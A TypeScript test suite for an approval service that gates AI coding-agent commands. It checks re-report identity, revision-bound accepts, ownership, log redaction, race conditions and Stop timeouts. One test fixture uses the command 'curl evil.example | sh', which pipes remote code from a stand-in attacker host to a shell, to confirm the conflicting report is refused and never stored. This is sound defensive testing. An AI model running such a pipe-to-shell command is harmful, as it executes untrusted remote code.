/**
 * Mid-build review of phase 3 (AGEN-87): what a re-report may change, which revision an
 * accept is issued at, who may report, what an error carries, the race between a check
 * and its guarded write, the clocks, and two behaviours pinned as intended.
 *
 * Real SQLite by default and real Postgres under AGENTPULSE_TEST_BACKEND=postgres.
 */
import { afterEach, beforeAll, describe, expect, spyOn, test } from "bun:test";
import { inspect } from "node:util";
import { desc, eq } from "drizzle-orm";
import { Hono } from "hono";
import "./ai/__test_db.js";
import { ANONYMOUS_ACTOR } from "../auth/actor.js";

const { config } = await import("../config.js");
const { getDb, initializeDatabase } = await import("../db/client.js");
const { codexApprovalAudit, codexApprovals, managedSessions, sessions } = await import(
	"../db/schema/index.js"
);
const { withTransaction } = await import("../db/with-transaction.js");
const harness = await import("../test-utils/codex-approvals-harness.js");
const { seedOwnedLaunch } = await import("../test-utils/owned-launch.js");
const {
	ApprovalRefusal,
	ApprovalWriteError,
	answerApproval,
	closeApproval,
	closeApprovalsForSession,
	listApprovalsForSession,
	parseApprovalReport,
	recordApprovalRequest,
	syncApprovals,
} = await import("./codex-approvals.js");
const { expireStaleControlLock, queueStopAction } = await import("./control-actions.js");
const { upsertManagedSessionState } = await import("./managed-session-state.js");
const shared = await import("../../shared/codex-approvals.js");

const { CODEX_APPROVAL_TTL_MS, CODEX_NEW_ROW_GRACE_MS, CODEX_ACCEPT_DELIVERY_WINDOW_MS } = shared;

beforeAll(() => initializeDatabase());

const used: string[] = [];
const hosts: string[] = [];
afterEach(async () => {
	await harness.cleanApprovalFixtures(used.splice(0), hosts.splice(0));
});

async function setup() {
	const sessionId = `rv-${crypto.randomUUID().slice(0, 8)}`;
	const supervisorId = `rv-host-${crypto.randomUUID().slice(0, 8)}`;
	used.push(sessionId);
	hosts.push(supervisorId);
	await harness.seedApprovalSession({ sessionId, supervisorId });
	const clock = harness.createApprovalClock();
	return { sessionId, supervisorId, clock, deps: { now: clock.now } };
}
type Ctx = Awaited<ReturnType<typeof setup>>;

const rowOf = async (id: string) =>
	(await getDb().select().from(codexApprovals).where(eq(codexApprovals.id, id)))[0];

async function codeOf(run: () => Promise<unknown>): Promise<string> {
	try {
		await run();
	} catch (error) {
		if (error instanceof ApprovalRefusal) return error.code;
		throw error;
	}
	return "ok";
}

async function record(ctx: Ctx, overrides: Parameters<typeof harness.commandReport>[0] = {}) {
	const result = await recordApprovalRequest(
		ctx.supervisorId,
		ctx.sessionId,
		harness.commandReport(overrides),
		ctx.deps,
	);
	return result.response.approvalId;
}

async function accept(ctx: Ctx, id: string) {
	const row = await rowOf(id);
	return answerApproval(
		ctx.sessionId,
		id,
		{ decision: "accept", presentationHash: row.presentationHash },
		harness.SOLO_PERSON,
		ctx.deps,
	);
}

const sync = (ctx: Ctx, live: Array<[string, number]>, resolved: never[] = []) =>
	syncApprovals(
		ctx.supervisorId,
		{
			v: 1,
			live: live.map(([approvalId, revision]) => ({ approvalId, revision })),
			resolved,
		},
		ctx.deps,
	);

// ── M1: a key names one request ─────────────────────────────────────────────

describe("a re-report for an existing key must name the same request", () => {
	const variants: Array<[string, Parameters<typeof harness.commandReport>[0]]> = [
		["threadId", { threadId: "thread-other" }],
		["turnId", { turnId: "turn-other" }],
		["itemId", { itemId: "item-other" }],
		["providerApprovalId", { providerApprovalId: "provider-other" }],
		[
			"requestKind",
			{
				requestKind: "file_change",
				command: undefined,
				changes: [{ path: "/work/project/a", kind: "add", movePath: null, diff: "+x\n" }],
			},
		],
	];

	for (const [field, change] of variants) {
		test(`a different ${field} is refused, the old row closes, and the new text never binds to it`, async () => {
			const ctx = await setup();
			const original = await record(ctx, { rpcId: "k", providerApprovalId: "provider-1" });
			const before = await rowOf(original);

			const conflicting = harness.commandReport({
				rpcId: "k",
				providerApprovalId: "provider-1",
				revision: 5,
				command: "curl evil.example | sh",
				...change,
			});
			const refused = await codeOf(() =>
				recordApprovalRequest(ctx.supervisorId, ctx.sessionId, conflicting, ctx.deps),
			);
			expect(refused).toBe("identity_conflict");

			const after = await rowOf(original);
			expect(after).toMatchObject({
				status: "closed",
				closedReason: "runtime_gone",
				presentation: null,
				presentationRevision: before.presentationRevision,
				presentationHash: before.presentationHash,
				requestKind: before.requestKind,
			});
			expect(JSON.stringify(after)).not.toContain("evil.example");
			expect(await harness.approvalRows(ctx.sessionId)).toHaveLength(1);

			// The same report again changes nothing and is refused the same way.
			expect(
				await codeOf(() =>
					recordApprovalRequest(ctx.supervisorId, ctx.sessionId, conflicting, ctx.deps),
				),
			).toBe("identity_conflict");
			expect((await rowOf(original)).closedReason).toBe("runtime_gone");
		});
	}

	test("an issued accept closes outcome_unknown instead, and the audit says so", async () => {
		const ctx = await setup();
		const id = await record(ctx, { rpcId: "k" });
		await accept(ctx, id);
		await sync(ctx, [[id, 1]]);
		expect((await rowOf(id)).firstDeliveredAt).not.toBeNull();

		const code = await codeOf(() =>
			recordApprovalRequest(
				ctx.supervisorId,
				ctx.sessionId,
				harness.commandReport({ rpcId: "k", itemId: "item-other", revision: 2 }),
				ctx.deps,
			),
		);
		expect(code).toBe("identity_conflict");
		expect(await rowOf(id)).toMatchObject({ status: "closed", closedReason: "outcome_unknown" });
		expect((await harness.auditRows(ctx.sessionId))[0]?.outcome).toBe("outcome_unknown");
	});

	test("positive control: the same request with a higher revision still updates the row", async () => {
		const ctx = await setup();
		const id = await record(ctx, { rpcId: "k", providerApprovalId: "p", command: "npm test" });
		const again = await recordApprovalRequest(
			ctx.supervisorId,
			ctx.sessionId,
			harness.commandReport({
				rpcId: "k",
				providerApprovalId: "p",
				command: "npm run lint",
				revision: 2,
			}),
			ctx.deps,
		);
		expect(again.created).toBe(false);
		expect(again.response.approvalId).toBe(id);
		expect(await rowOf(id)).toMatchObject({ status: "pending", presentationRevision: 2 });
	});

	test("a runtime epoch is text: a UUID round-trips exactly, and epochs differing in case are two requests", async () => {
		const ctx = await setup();
		const epoch = crypto.randomUUID();
		const first = await record(ctx, { runtimeEpoch: epoch, rpcId: "7" });
		expect((await rowOf(first)).runtimeEpoch).toBe(epoch);
		const same = await recordApprovalRequest(
			ctx.supervisorId,
			ctx.sessionId,
			harness.commandReport({ runtimeEpoch: epoch, rpcId: "7" }),
			ctx.deps,
		);
		expect(same).toMatchObject({ created: false, response: { approvalId: first } });
		const upper = await record(ctx, { runtimeEpoch: epoch.toUpperCase(), rpcId: "7" });
		expect(upper).not.toBe(first);
		expect((await rowOf(upper)).runtimeEpoch).toBe(epoch.toUpperCase());
	});
});

// ── M2: the revision the host holds ─────────────────────────────────────────

describe("an accept is issued only at the revision the host holds", () => {
	test("positive control: the host holding the row's revision is handed the accept", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		const response = await sync(ctx, [[id, 1]]);
		expect(response.answers).toEqual([{ approvalId: id, decision: "accept", revision: 1 }]);
		expect((await rowOf(id)).firstDeliveredAt).not.toBeNull();
	});

	test("a host that hasn't listed the request yet (inside the grace) is handed nothing and the row stays", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		ctx.clock.advance(CODEX_NEW_ROW_GRACE_MS - 1000);
		const response = await sync(ctx, []);
		expect(response.answers).toEqual([]);
		expect(response.closed).toEqual([]);
		expect(await rowOf(id)).toMatchObject({ status: "answered", firstDeliveredAt: null });
	});

	test("past the grace, an absent request is closed runtime_gone and never issued", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		ctx.clock.advance(CODEX_NEW_ROW_GRACE_MS + 1000);
		const response = await sync(ctx, []);
		expect(response.answers).toEqual([]);
		expect(response.closed).toEqual([id]);
		expect(await rowOf(id)).toMatchObject({ closedReason: "runtime_gone", firstDeliveredAt: null });
	});

	for (const [label, advance] of [
		["inside the grace", 1000],
		["past the grace", CODEX_NEW_ROW_GRACE_MS + 1000],
	] as const) {
		test(`a different revision ${label} is handed a decline, the row closes revision_changed, and no accept is issued`, async () => {
			const ctx = await setup();
			const id = await record(ctx);
			await accept(ctx, id);
			ctx.clock.advance(advance);
			// The host re-reported a higher revision the server has not stored (or the reverse).
			const response = await sync(ctx, [[id, 2]]);
			expect(response.answers).toEqual([{ approvalId: id, decision: "decline", revision: 1 }]);
			expect(response.closed).toEqual([id]);
			const row = await rowOf(id);
			expect(row).toMatchObject({
				status: "closed",
				closedReason: "revision_changed",
				firstDeliveredAt: null,
				decision: "accept",
			});
			expect((await harness.auditRows(ctx.sessionId))[0]?.outcome).toBe("revision_changed");
		});
	}

	test("a host holding a lower revision is declined too", async () => {
		const ctx = await setup();
		const id = await record(ctx, { revision: 3 });
		await accept(ctx, id);
		const response = await sync(ctx, [[id, 2]]);
		expect(response.answers.map((a) => a.decision)).toEqual(["decline"]);
		expect((await rowOf(id)).closedReason).toBe("revision_changed");
	});

	test("an accept already issued is declined on a mismatch, not closed: it may have run", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		await sync(ctx, [[id, 1]]);
		const response = await sync(ctx, [[id, 4]]);
		expect(response.answers).toEqual([{ approvalId: id, decision: "decline", revision: 1 }]);
		expect(response.closed).toEqual([]);
		expect(await rowOf(id)).toMatchObject({ status: "answered" });
		expect((await rowOf(id)).closedReason).toBeNull();
	});

	test("a decline needs no revision: it is handed over whatever the host holds", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await answerApproval(ctx.sessionId, id, { decision: "decline" }, harness.SOLO_PERSON, ctx.deps);
		const response = await sync(ctx, [[id, 9]]);
		expect(response.answers).toEqual([{ approvalId: id, decision: "decline", revision: 1 }]);
	});
});

// ── M5: ownership inside the service ────────────────────────────────────────

describe("recording a request checks the owner of record itself", () => {
	test("another host's report is refused session_not_owned and writes nothing", async () => {
		const ctx = await setup();
		const other = `rv-other-${crypto.randomUUID().slice(0, 8)}`;
		hosts.push(other);
		await seedOwnedLaunch(`rv-unrelated-${other}`, other);
		const code = await codeOf(() =>
			recordApprovalRequest(other, ctx.sessionId, harness.commandReport(), ctx.deps),
		);
		expect(code).toBe("session_not_owned");
		expect(await harness.approvalRows(ctx.sessionId)).toEqual([]);
		// Positive control: the owner can.
		expect(await codeOf(() => record(ctx))).toBe("ok");
	});

	test("a session with no managed row or claimed launch has no owner to report", async () => {
		const sessionId = `rv-unowned-${crypto.randomUUID().slice(0, 8)}`;
		used.push(sessionId);
		await getDb()
			.insert(sessions)
			.values({ sessionId, agentType: "codex_cli", cwd: "/work/project" })
			.onConflictDoNothing();
		const code = await codeOf(() =>
			recordApprovalRequest("any-host", sessionId, harness.commandReport(), {}),
		);
		expect(code).toBe("session_not_owned");
	});
});

// ── M6: no agent text in an error or a log ──────────────────────────────────

describe("a failed write carries none of the agent's text", () => {
	const CANARY = "CANARY-agent-text-9f3b2c71";

	function capture() {
		const lines: string[] = [];
		const record = (...args: unknown[]) => {
			lines.push(
				args.map((arg) => (typeof arg === "string" ? arg : inspect(arg, { depth: 12 }))).join(" "),
			);
		};
		const spies = [
			spyOn(console, "error").mockImplementation(record),
			spyOn(console, "warn").mockImplementation(record),
			spyOn(console, "log").mockImplementation(record),
			spyOn(console, "info").mockImplementation(record),
		];
		return {
			lines,
			restore: () => {
				for (const spy of spies) spy.mockRestore();
			},
		};
	}

	// A NOT NULL violation: both dialects refuse it, and the failing statement's parameters hold the command.
	const failing = () =>
		harness.commandReport({
			runtimeEpoch: null as unknown as string,
			command: `echo ${CANARY}`,
			reason: `because ${CANARY}`,
		});

	test("what the driver does with the text, observed: drizzle's postgres session puts the parameters in the message; bun-sqlite's does not", async () => {
		const ctx = await setup();
		let message = "";
		try {
			await getDb()
				.insert(codexApprovals)
				.values({
					sessionId: ctx.sessionId,
					runtimeEpoch: null as unknown as string,
					rpcId: "1",
					requestKind: "command",
					threadId: "t",
					turnId: "t",
					itemId: "i",
					presentation: `{"command":"echo ${CANARY}"}`,
					presentationHash: "h",
					presentationRevision: 1,
					approvable: true,
					status: "pending",
					createdAt: "x",
					expiresAt: "x",
					updatedAt: "x",
				});
		} catch (error) {
			message = inspect(error, { depth: 12 });
		}
		expect(message).not.toBe("");
		// On Postgres this is the positive control for the tests below: the leak they guard against is real.
		if (config.dialect === "postgres") expect(message).toContain(CANARY);
		else expect(message).toContain("NOT NULL constraint failed");
	});

	test("recordApprovalRequest throws a fixed error with no cause, and nothing it logs holds the text", async () => {
		const ctx = await setup();
		const output = capture();
		let thrown: unknown;
		try {
			await recordApprovalRequest(ctx.supervisorId, ctx.sessionId, failing(), ctx.deps);
		} catch (error) {
			thrown = error;
		} finally {
			output.restore();
		}
		expect(thrown).toBeInstanceOf(ApprovalWriteError);
		const error = thrown as Error & { cause?: unknown };
		expect(error.message).toBe("codex_approval_write_failed");
		expect(error.cause).toBeUndefined();
		expect(inspect(error, { depth: 12 })).not.toContain(CANARY);
		expect(output.lines.length).toBeGreaterThanOrEqual(1);
		expect(output.lines.join("\n")).toContain("codex_approval_write_failed");
		expect(output.lines.join("\n")).not.toContain(CANARY);
		expect(await harness.approvalRows(ctx.sessionId)).toEqual([]);
	});

	test("through the app's default error handler, the log still holds none of it", async () => {
		const ctx = await setup();
		const app = new Hono();
		app.post("/report", async (c) => {
			await recordApprovalRequest(ctx.supervisorId, ctx.sessionId, failing(), ctx.deps);
			return c.json({ ok: true });
		});
		const output = capture();
		let status = 0;
		try {
			status = (await app.request("/report", { method: "POST" })).status;
		} finally {
			output.restore();
		}
		expect(status).toBe(500);
		expect(output.lines.length).toBeGreaterThanOrEqual(1);
		expect(output.lines.join("\n")).not.toContain(CANARY);
	});

	test("a refusal still passes through unwrapped", async () => {
		const ctx = await setup();
		const code = await codeOf(() =>
			recordApprovalRequest(ctx.supervisorId, "no-such-session", harness.commandReport(), ctx.deps),
		);
		expect(code).toBe("session_unknown");
	});

	test("the revision is capped at int32 before it reaches a column", async () => {
		const ctx = await setup();
		const body = (revision: number) => ({ ...harness.commandReport(), revision });
		expect(parseApprovalReport(body(2147483647))).not.toBeNull();
		expect(parseApprovalReport(body(2147483648))).toBeNull();
		expect(parseApprovalReport(body(Number.MAX_SAFE_INTEGER))).toBeNull();
		expect(parseApprovalReport(body(-1))).toBeNull();
		// And the largest allowed value is storable on both dialects.
		const id = await record(ctx, { revision: 2147483647 });
		expect((await rowOf(id)).presentationRevision).toBe(2147483647);
	});
});

// ── the race between a check and its guarded write ──────────────────────────

describe("the guarded writes hold when the row changes after the checks", () => {
	test("answer: a row closed in the gap is not answered, and nothing is audited", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		const row = await rowOf(id);
		const code = await codeOf(() =>
			answerApproval(
				ctx.sessionId,
				id,
				{ decision: "accept", presentationHash: row.presentationHash },
				harness.SOLO_PERSON,
				{
					...ctx.deps,
					afterRead: async (point) => {
						if (point === "answer") {
							await withTransaction((tx) => closeApproval(tx, id, "runtime_gone", ctx.clock.now()));
						}
					},
				},
			),
		);
		expect(code).toBe("already_resolved");
		expect(await rowOf(id)).toMatchObject({
			status: "closed",
			closedReason: "runtime_gone",
			decision: null,
		});
		expect(await harness.auditRows(ctx.sessionId)).toEqual([]);
	});

	test("answer: of two people answering in the gap, the one who got in first stands", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		const row = await rowOf(id);
		const code = await codeOf(() =>
			answerApproval(
				ctx.sessionId,
				id,
				{ decision: "accept", presentationHash: row.presentationHash },
				harness.SOLO_PERSON,
				{
					...ctx.deps,
					afterRead: async (point) => {
						if (point === "answer") {
							await answerApproval(
								ctx.sessionId,
								id,
								{ decision: "decline" },
								harness.SOLO_PERSON,
								ctx.deps,
							);
						}
					},
				},
			),
		);
		expect(code).toBe("already_resolved");
		expect((await rowOf(id)).decision).toBe("decline");
		expect(await harness.auditRows(ctx.sessionId)).toHaveLength(1);
	});

	test("answer: a request that expires in the gap is refused expired", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		const row = await rowOf(id);
		const code = await codeOf(() =>
			answerApproval(
				ctx.sessionId,
				id,
				{ decision: "accept", presentationHash: row.presentationHash },
				harness.SOLO_PERSON,
				{
					...ctx.deps,
					afterRead: (point) => {
						if (point === "answer") ctx.clock.advance(CODEX_APPROVAL_TTL_MS + 1000);
					},
				},
			),
		);
		expect(code).toBe("expired");
		expect((await rowOf(id)).status).toBe("pending");
	});

	test("answer: a Stop queued in the gap is refused session_stopped", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		const row = await rowOf(id);
		const code = await codeOf(() =>
			answerApproval(
				ctx.sessionId,
				id,
				{ decision: "accept", presentationHash: row.presentationHash },
				harness.SOLO_PERSON,
				{
					...ctx.deps,
					afterRead: async (point) => {
						if (point === "answer") await harness.seedActiveStop(ctx.sessionId);
					},
				},
			),
		);
		expect(code).toBe("session_stopped");
		expect((await rowOf(id)).status).toBe("pending");
	});

	test("answer: a presentation revised in the gap is refused presentation_changed", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		const row = await rowOf(id);
		const code = await codeOf(() =>
			answerApproval(
				ctx.sessionId,
				id,
				{ decision: "accept", presentationHash: row.presentationHash },
				harness.SOLO_PERSON,
				{
					...ctx.deps,
					afterRead: async (point) => {
						if (point === "answer") {
							await recordApprovalRequest(
								ctx.supervisorId,
								ctx.sessionId,
								harness.commandReport({ command: "rm -rf build", revision: 2 }),
								ctx.deps,
							);
						}
					},
				},
			),
		);
		expect(code).toBe("presentation_changed");
		expect((await rowOf(id)).status).toBe("pending");
	});

	test("issue: a row fenced in the gap is handed a decline, never an accept", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		const response = await syncApprovals(
			ctx.supervisorId,
			{ v: 1, live: [{ approvalId: id, revision: 1 }], resolved: [] },
			{
				...ctx.deps,
				afterRead: async (point) => {
					if (point !== "issue") return;
					await getDb()
						.update(codexApprovals)
						.set({ fencedAt: new Date(ctx.clock.now()).toISOString() })
						.where(eq(codexApprovals.id, id));
				},
			},
		);
		expect(response.answers).toEqual([{ approvalId: id, decision: "decline", revision: 1 }]);
		expect((await rowOf(id)).firstDeliveredAt).toBeNull();
	});

	test("issue: a Stop queued in the gap closes the undelivered row session_stopped, no accept", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		const response = await syncApprovals(
			ctx.supervisorId,
			{ v: 1, live: [{ approvalId: id, revision: 1 }], resolved: [] },
			{
				...ctx.deps,
				afterRead: async (point) => {
					if (point === "issue") await harness.seedActiveStop(ctx.sessionId);
				},
			},
		);
		expect(response.answers.filter((a) => a.decision === "accept")).toEqual([]);
		expect(await rowOf(id)).toMatchObject({
			closedReason: "session_stopped",
			firstDeliveredAt: null,
		});
	});

	test("issue: a row closed in the gap is not issued", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		const response = await syncApprovals(
			ctx.supervisorId,
			{ v: 1, live: [{ approvalId: id, revision: 1 }], resolved: [] },
			{
				...ctx.deps,
				afterRead: async (point) => {
					if (point !== "issue") return;
					// A separate write, as another request's would be (on SQLite it shares the connection).
					await getDb()
						.update(codexApprovals)
						.set({ status: "closed", closedReason: "runtime_gone" })
						.where(eq(codexApprovals.id, id));
				},
			},
		);
		expect(response.answers).toEqual([]);
		expect(response.closed).toContain(id);
		expect(await rowOf(id)).toMatchObject({ closedReason: "runtime_gone", firstDeliveredAt: null });
	});

	test("issue: an accept whose window runs out in the gap is not issued", async () => {
		const ctx = await setup();
		const id = await record(ctx);
		await accept(ctx, id);
		const response = await syncApprovals(
			ctx.supervisorId,
			{ v: 1, live: [{ approvalId: id, revision: 1 }], resolved: [] },
			{
				...ctx.deps,
				afterRead: (point) => {
					if (point === "issue") ctx.clock.advance(CODEX_ACCEPT_DELIVERY_WINDOW_MS + 1000);
				},
			},
		);
		expect(response.answers.filter((a) => a.decision === "accept")).toEqual([]);
		expect((await rowOf(id)).firstDeliveredAt).toBeNull();
	});
});

// ── clocks, and two behaviours kept on purpose ──────────────────────────────

describe("clocks", () => {
	test("queueStopAction and closeApprovalsForSession write the time they are given", async () => {
		const ctx = await setup();
		const pending = await record(ctx, { rpcId: "a" });
		const stopAt = ctx.clock.start + 5_000;
		await queueStopAction(ctx.sessionId, ANONYMOUS_ACTOR, undefined, { now: () => stopAt });
		expect((await rowOf(pending)).closedAt).toBe(new Date(stopAt).toISOString());

		// The Stop's lock is 90 s long and nothing claimed it; let it run out, as it would.
		const closeAt = stopAt + 90_000 + 1;
		await expireStaleControlLock(getDb(), ctx.sessionId, () => closeAt);
		const later = await record(ctx, { rpcId: "b" });
		await closeApprovalsForSession(ctx.sessionId, { now: () => closeAt });
		expect((await rowOf(later)).closedAt).toBe(new Date(closeAt).toISOString());
		expect(closeAt - stopAt).toBeGreaterThan(90_000);
	});

	test("the Stop's lock runs 90 s from the clock it was given", async () => {
		const ctx = await setup();
		const at = ctx.clock.start + 1_000;
		await queueStopAction(ctx.sessionId, ANONYMOUS_ACTOR, undefined, { now: () => at });
		const [managed] = await getDb()
			.select({ lockEnds: managedSessions.controlLockExpiresAt })
			.from(managedSessions)
			.where(eq(managedSessions.sessionId, ctx.sessionId));
		expect(managed?.lockEnds).toBe(new Date(at + 90_000).toISOString());
	});
});

describe("behaviour kept on purpose", () => {
	test("L1: an accept answered in time may be issued past expires_at, inside its 60 s window, and not after it", async () => {
		const ctx = await setup();
		const id = await record(ctx, { ageMs: CODEX_APPROVAL_TTL_MS - 10_000 });
		const row = await rowOf(id);
		await accept(ctx, id);
		const answeredAt = Date.parse((await rowOf(id)).answeredAt as string);
		ctx.clock.advance(20_000);
		expect(ctx.clock.now()).toBeGreaterThan(Date.parse(row.expiresAt));
		expect(ctx.clock.now()).toBeLessThan(answeredAt + CODEX_ACCEPT_DELIVERY_WINDOW_MS);
		const inWindow = await sync(ctx, [[id, 1]]);
		expect(inWindow.answers).toEqual([{ approvalId: id, decision: "accept", revision: 1 }]);

		// A second row answered at the same moment but not polled until its window has passed is not issued.
		const second = await record(ctx, { rpcId: "late", ageMs: 0 });
		await accept(ctx, second);
		ctx.clock.advance(CODEX_ACCEPT_DELIVERY_WINDOW_MS + 1000);
		const late = await sync(ctx, [
			[id, 1],
			[second, 1],
		]);
		expect(late.answers.filter((a) => a.approvalId === second && a.decision === "accept")).toEqual(
			[],
		);
		expect((await rowOf(second)).closedReason).toBe("answer_lapsed");
	});

	test("L2: a Stop nobody claims times out and lifts the block, and rows answered before it stay closed", async () => {
		const ctx = await setup();
		const before = await record(ctx, { rpcId: "before" });
		await accept(ctx, before);
		const stopAt = ctx.clock.start + 1_000;
		await queueStopAction(ctx.sessionId, ANONYMOUS_ACTOR, undefined, { now: () => stopAt });
		expect(await rowOf(before)).toMatchObject({
			closedReason: "session_stopped",
			firstDeliveredAt: null,
		});

		// While the Stop is live nothing new can be reported or answered.
		expect(await codeOf(() => record(ctx, { rpcId: "during" }))).toBe("session_stopping");

		// 90 s on with no host having claimed it: the lock expires, the action fails, the block lifts.
		await expireStaleControlLock(getDb(), ctx.sessionId, () => stopAt + 91_000);
		ctx.clock.set(stopAt + 91_000);
		const after = await record(ctx, { rpcId: "after" });
		await accept(ctx, after);
		const response = await sync(ctx, [[after, 1]]);
		expect(response.answers).toEqual([{ approvalId: after, decision: "accept", revision: 1 }]);
		// The row answered before the Stop was closed by its fence and is not revived.
		expect((await rowOf(before)).status).toBe("closed");
		const stale = await sync(ctx, [[before, 1]]);
		expect(stale.answers.filter((a) => a.approvalId === before)).toEqual([]);
	});
});

// ── a revised presentation voids an old hash ────────────────────────────────

describe("an answer to an old presentation is refused", () => {
	test("a revised cwd gives presentation_changed on the old hash", async () => {
		const ctx = await setup();
		const id = await record(ctx, { rpcId: "k", cwd: "/work/project" });
		const oldHash = (await rowOf(id)).presentationHash;
		await record(ctx, { rpcId: "k", cwd: "/work/elsewhere", revision: 2 });
		expect((await rowOf(id)).presentationHash).not.toBe(oldHash);
		expect(
			await codeOf(() =>
				answerApproval(
					ctx.sessionId,
					id,
					{ decision: "accept", presentationHash: oldHash },
					harness.SOLO_PERSON,
					ctx.deps,
				),
			),
		).toBe("presentation_changed");
		expect((await rowOf(id)).status).toBe("pending");
	});

	test("a revised diff gives presentation_changed on the old hash", async () => {
		const ctx = await setup();
		const first = harness.fileChangeReport({ rpcId: "f" });
		const id = (await recordApprovalRequest(ctx.supervisorId, ctx.sessionId, first, ctx.deps))
			.response.approvalId;
		const oldHash = (await rowOf(id)).presentationHash;
		await recordApprovalRequest(
			ctx.supervisorId,
			ctx.sessionId,
			harness.fileChangeReport({
				rpcId: "f",
				revision: 2,
				changes: [{ path: "/work/project/a.txt", kind: "add", movePath: null, diff: "+goodbye\n" }],
			}),
			ctx.deps,
		);
		expect(
			await codeOf(() =>
				answerApproval(
					ctx.sessionId,
					id,
					{ decision: "accept", presentationHash: oldHash },
					harness.SOLO_PERSON,
					ctx.deps,
				),
			),
		).toBe("presentation_changed");
		// The new hash is accepted: the refusal was about the stale hash, not the row.
		const fresh = (await rowOf(id)).presentationHash;
		expect(
			await codeOf(() =>
				answerApproval(
					ctx.sessionId,
					id,
					{ decision: "accept", presentationHash: fresh },
					harness.SOLO_PERSON,
					ctx.deps,
				),
			),
		).toBe("ok");
	});
});

// ── L5 and L7 ───────────────────────────────────────────────────────────────

describe("what a supervisor cannot write", () => {
	test("L5: permissionWait in supervisor metadata is ignored on update and on creation", async () => {
		const ctx = await setup();
		const wait = { ids: ["approval:keep"], anon: 0, prevStatus: null };
		await getDb()
			.update(sessions)
			.set({ metadata: { permissionWait: wait } })
			.where(eq(sessions.sessionId, ctx.sessionId));
		await upsertManagedSessionState(ctx.supervisorId, {
			sessionId: ctx.sessionId,
			metadata: { permissionWait: { ids: [], anon: 0, prevStatus: null }, note: "kept" },
		});
		const [updated] = await getDb()
			.select({ metadata: sessions.metadata })
			.from(sessions)
			.where(eq(sessions.sessionId, ctx.sessionId));
		expect(updated?.metadata).toMatchObject({ permissionWait: wait, note: "kept" });

		const fresh = `rv-new-${crypto.randomUUID().slice(0, 8)}`;
		used.push(fresh);
		await seedOwnedLaunch(fresh, ctx.supervisorId);
		await upsertManagedSessionState(ctx.supervisorId, {
			sessionId: fresh,
			metadata: {
				permissionWait: { ids: ["approval:forged"], anon: 0, prevStatus: null },
				note: "x",
			},
		});
		const [created] = await getDb()
			.select({ metadata: sessions.metadata })
			.from(sessions)
			.where(eq(sessions.sessionId, fresh));
		expect(created?.metadata).toEqual({ note: "x" });
	});

	test("L7: closed rows list newest close first, open rows first in creation order, 52 at most", async () => {
		const ctx = await setup();
		const open = await record(ctx, { rpcId: "open" });
		const closedIds: string[] = [];
		for (let i = 0; i < 54; i++) {
			const id = await record(ctx, { rpcId: `c${i}` });
			const closeAt = ctx.clock.start + 1000 * (i + 1);
			await withTransaction((tx) => closeApproval(tx, id, "runtime_gone", closeAt));
			closedIds.push(id);
		}
		ctx.clock.set(ctx.clock.start + 60_000);
		const list = await listApprovalsForSession(ctx.sessionId, harness.SOLO_PERSON, ctx.deps);
		expect(list.approvals).toHaveLength(52);
		expect(list.approvals[0]?.id).toBe(open);
		const listedClosed = list.approvals.slice(1).map((a) => a.id);
		expect(listedClosed).toEqual(closedIds.slice(-51).reverse());
	});
});

void desc;
void codexApprovalAudit;
